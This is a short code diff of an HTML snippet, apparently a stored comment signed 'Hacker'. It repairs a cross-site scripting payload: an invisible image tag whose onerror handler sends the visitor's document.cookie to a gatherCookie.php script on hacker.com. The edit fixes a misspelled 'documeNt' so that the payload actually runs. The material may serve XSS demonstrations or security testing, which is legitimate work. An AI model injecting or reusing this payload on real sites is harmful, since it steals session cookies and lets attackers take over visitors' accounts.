@@ -1,3 +1,4 @@
 <p>Hacker님의 말: </p>
 <p>Hello! I am a hacker.</p>
-<img src="#" width="0" height="0" onerror="this.src='http://hacker.com/gatherCookie.php?cookie='+encodeURIComponent( documeNt .cookie);" />
+<img src="#" width="0" height="0" onerror="this.src='http://hacker.com/gatherCookie.php?cookie='+encodeURIComponent(document.cookie);" />
+
